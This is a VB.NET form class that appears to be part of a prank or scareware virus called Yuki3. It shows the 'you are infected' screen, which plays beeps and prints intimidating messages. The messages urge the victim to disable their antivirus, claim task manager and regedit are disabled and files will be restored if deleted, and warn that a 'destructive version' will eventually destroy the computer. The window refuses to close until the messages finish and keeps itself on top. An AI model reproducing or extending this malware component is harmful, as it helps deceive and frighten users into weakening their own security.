Public Class Yuki___infected
    Dim DisClBtn As Boolean = True
    Private Sub Yuki___infected_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        BackgroundWorker1.RunWorkerAsync()
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        ListBox1.Items.Add("Yuki3.begin log()")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("hello user I would like to inform you....")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("that your computer has been infected with my virus")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("It's very hard to remove so don't try")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("I suggest you disable your antivirus program....") 'as it will mess with the program and spam your computer
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("As it will mess with the program and spam your computer")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("You will see random payloads on different dates so be prepared")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("I don't do any real harm I'm just here to annoy you")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
            Threading.Thread.Sleep(3000)
            ListBox1.Items.Add("Wait... you enabled the destructive version of the program")
            Threading.Thread.Sleep(3000)
            ListBox1.Items.Add("in that case you're pretty screwed...")
            Threading.Thread.Sleep(3000)
            ListBox1.Items.Add("I guess just use your computer as long as you can until I destroy it eventually")
        End If
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("I also Disabled task manager and regedit...")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("you can't delete the program files of this program as I will just restore them")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("So Have Fun!")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        Threading.Thread.Sleep(3000)
        ListBox1.Items.Add("Yuki3.End log()")
        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
        DisClBtn = False
    End Sub

    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged

    End Sub

    Private Sub Yuki___infected_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If DisClBtn = True Then
            e.Cancel = True
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.TopMost = True
    End Sub
End Class